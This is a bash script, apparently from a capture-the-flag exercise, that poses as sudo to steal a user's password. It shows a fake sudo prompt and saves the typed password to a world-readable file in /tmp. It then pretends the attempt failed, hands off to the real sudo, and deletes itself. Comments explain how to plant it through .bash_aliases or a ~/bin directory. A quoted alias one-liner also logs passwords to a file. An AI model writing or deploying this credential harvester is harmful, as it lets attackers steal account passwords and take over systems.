#!/usr/bin/env bash
# I wrote this in school for a "read the root:root 0700 file" challenge
# If you can modify a users .bash_aliases, you can alias sudo to this
# If you can drop a file in ~/bin (and that's at the start of a users path), you can put this there.
# Read the comments because certain quirks work if it's an alias vs if it's in ~/bin
#
# from noproto:
# alias sudo='echo -n "[sudo] password for $USER: ";stty -echo;read passwd;stty echo;echo;echo $passwd|tee -a pwlog|sudo -S -p ""'
#

user=$(whoami)
outPath=/tmp/01234-9876-ABEEFC0
# Set a different cleanup file if you want to easily be able to re-capture
# By using the same cleanUp indicator as the outPath file, it cleans up after itself.
cleanUp=/tmp/01234-9876-ABEEFC0
pwPrompt="[sudo] password for $user:\x20"
errStr="Sorry, try again."
# This myPath works if you're dropping it as a binary in $PATH
myPath="$( cd "$(dirname "$0")" ; pwd -P )/$0"

# This myPath works if you're aliasing sudo to this script
#myPath="$0"

if [ -f $outPath ]
then
    /usr/bin/sudo $@
else
    echo -ne $pwPrompt
    read -s PASSWORD
    echo
    echo $PASSWORD > $outPath
    chmod ugo+rw $outPath
    echo $errStr
    /usr/bin/sudo $@
fi
if [ -f $cleanUp ]
then
   rm $myPath
   # if it's an alias, you need to clean it up, else you can just delete yourself.
   #unalias sudo
   #rm ~/.bash_aliases
fi
